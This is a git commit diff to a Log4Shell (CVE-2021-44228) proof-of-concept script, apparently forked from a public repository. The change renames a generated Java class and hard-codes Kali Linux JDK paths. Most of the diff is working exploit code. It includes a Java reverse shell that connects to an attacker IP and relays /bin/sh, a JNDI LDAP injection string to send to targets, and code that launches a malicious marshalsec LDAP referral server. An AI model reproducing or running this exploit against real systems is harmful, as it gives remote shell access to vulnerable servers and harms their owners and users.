0f62d2bc15e69867f35f56128ad99c36fc292dea
xsankorre <haahisagaev@gmail.com>
2022-02-23 07:38:17 -0600

    Little edit orig;

--- poc-orig.py
+++ poc-orig.py
@@ -9,7 +9,6 @@ import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 CUR_FOLDER = Path(__file__).parent.resolve()
-JAVA_PATH = "/full/path/to/jdk1.8.0_102/bin"
 
 
 def generate_payload(userip: str, lport: int) -> None:
@@ -19,55 +18,53 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class Malic {
+public class Exploit {
 
-    public Malic() throws Exception { 
+    public Exploit() throws Exception {
         String host="%s";
         int port=%d;
-	    String cmd="/bin/sh";
-	    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-	    Socket s=new Socket(host,port);
-	    InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
+        String cmd="/bin/sh";
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),
+            pe=p.getErrorStream(),
+            si=s.getInputStream();
         OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-   	    while(!s.isClosed()) {
-   	    	while(pi.available()>0)
-				so.write(pi.read());
-    	        while(pe.available()>0)
-    	            so.write(pe.read());
-    	        while(si.available()>0)
-    	            po.write(si.read());
-    	        so.flush();
-    	        po.flush();
-    	        Thread.sleep(50);
-	            try {
-    	            p.exitValue();
-	                break;
-    	        }
-	            catch (Exception e) {
-            		//e.printStackTrace();
-	            }
-		};
+        while(!s.isClosed()) {
+            while(pi.available()>0)
+                so.write(pi.read());
+            while(pe.available()>0)
+                so.write(pe.read());
+            while(si.available()>0)
+                po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try {
+                p.exitValue();
+                break;
+            }
+            catch (Exception e){
+            }
+        };
         p.destroy();
         s.close();
-	} 
+    }
 }
 """ % (userip, lport)
 
-    
-    # writing the exploit to Malic.java file
-    p = Path("Malic.java")
+    # writing the exploit to Exploit.java file
+
+    p = Path("Exploit.java")
 
     try:
         p.write_text(program)
-        # java_path = "jdk1.8.0_20/bin/javac"
-        # subprocess.run([os.path.join(CUR_FOLDER, java_path), str(p)])
-        subprocess.run([f'{JAVA_PATH}/javac', str(p)])
-        	
+        subprocess.run([os.path.join(CUR_FOLDER, "/home/kali/pentest/exploits/log4j/log4j-shell-poc/jdk1.8.0_102/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
     else:
-        print(Fore.GREEN + '[+] Java class created success')
+        print(Fore.GREEN + '[+] Exploit java class created success')
 
 
 def payload(userip: str, webport: int, lport: int) -> None:
@@ -86,26 +83,20 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 
 def check_java() -> bool:
-	# java_path = 'jdk1.8.0_20/bin/java'
-	
     exit_code = subprocess.call([
-        f'{JAVA_PATH}/java',
+        os.path.join(CUR_FOLDER, '/home/kali/pentest/exploits/log4j/log4j-shell-poc/jdk1.8.0_102/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
 
 
 def ldap_server(userip: str, lport: int) -> None:
-	# This script started the malicious local LDAP server.
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
-    
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
-    url = "http://{}:{}/#Malic".format(userip, lport)
-    
-    # java_path = 'jdk1.8.0_20/bin/java'
+    url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        f'{JAVA_PATH}/java',
+        os.path.join(CUR_FOLDER, "/home/kali/pentest/exploits/log4j/log4j-shell-poc/jdk1.8.0_102/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
@@ -117,7 +108,7 @@ def main() -> None:
     init(autoreset=True)
     print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
-[!] Original: Github repo: https://github.com/kozmer/log4j-shell-poc
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
 """)
 
     parser = argparse.ArgumentParser(description='log4shell PoC')
@@ -141,9 +132,9 @@ def main() -> None:
 
     try:
         if not check_java():
-            print(Fore.RED + f'[-] Java "{JAVA_PATH}" not found.')
+            print(Fore.RED + '[-] Java is not installed inside the repository')
             raise SystemExit(1)
-        payload(userip=args.userip, webport=args.webport, lport=args.lport)
+        payload(args.userip, args.webport, args.lport)
     except KeyboardInterrupt:
         print(Fore.RED + "user interrupted the program.")
         raise SystemExit(0)
